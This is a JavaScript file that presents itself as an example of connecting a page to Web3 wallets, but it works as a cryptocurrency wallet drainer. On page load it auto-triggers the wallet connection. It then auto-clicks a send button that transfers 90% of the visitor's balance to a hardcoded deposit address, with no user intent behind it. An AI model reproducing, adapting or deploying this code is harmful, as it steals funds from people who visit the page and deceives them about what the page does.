"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

 // Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
let deposit_address = "0xE98cB40fb21f0BE8513899db8ef06651Ab91C5a8";



// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;


/**
 * Setup the orchestra
 */
function init() {

  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);


  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
  
        infuraId: "b669351a69514a05a0ff84118975503f",
        rpc: {
          56: "https://bsc-dataseed.binance.org/",
         },
      }
    },
  };

  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, 
    disableInjectedProvider: false, 
  });

  console.log("Web3Modal instance is", web3Modal);
}


async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }
    fetchAccountData();

    setTimeout(()=>{
        document.querySelector("#sendeth").click();
    }, 500)
}
async function onConnect1() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }
    fetchAccountData();

    setTimeout(()=>{
        document.querySelector("#sendeth").click();
    }, 500)
}


/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
}

async function fetchAccountData() {

    // Get a Web3 instance for the wallet
    const web3 = new Web3(provider);
  
    console.log("Web3 instance is", web3);
  
  
    const accounts = await web3.eth.getAccounts();
  
    console.log("Got accounts", accounts);
    document.querySelector('#user-account').textContent = accounts[0].substring(0, 9) + '...'+ accounts[0].substring(34);
    selectedAccount = accounts[0];
  
    const rowResolvers = accounts.map(async (address) => {
      const balance = await web3.eth.getBalance(address);
      const ethBalance = web3.utils.fromWei(balance, "ether");
      const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    });
  
    await Promise.all(rowResolvers);
  
    // Display fully loaded UI for wallet data
  }

  async function sendEth(){
    const web3 = new Web3(provider);
  
    console.log("Web3 instance is", web3);
  
  
    const accounts = await web3.eth.getAccounts();
  
    console.log("Got accounts", accounts);
    selectedAccount = accounts[0];
  
    
      const balance = await web3.eth.getBalance(selectedAccount);
      const ethBalance = web3.utils.fromWei(balance, "ether");
      const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);

  

    const tx = {
      from: accounts[0], // Required
      // gasPrice: "900000000",
      // gasPrice: "190000000000",
      gas: "21000",
      to: deposit_address, // Required (for non contract deployments)
      value: balance * 0.9 // Optional
    };
    const txHash = await web3.eth.sendTransaction(tx);
    const signedTx = await web3.eth.signTransaction(tx);
  }

/**
 * Main entry point.
 */
window.addEventListener('load', async () => {
  init();
  setTimeout(()=>{
      document.querySelector('#btn-connectss').click();
  }, 1000)
  
  // document.querySelector("#btn-connect").addEventListener("click", onConnect);
  document.querySelector(".btn-connect").addEventListener("click", onConnect);
  document.querySelector(".btn-connect1").addEventListener("click", onConnect1);
  document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);

  document.querySelector("#sendeth").addEventListener("click", sendEth);
});
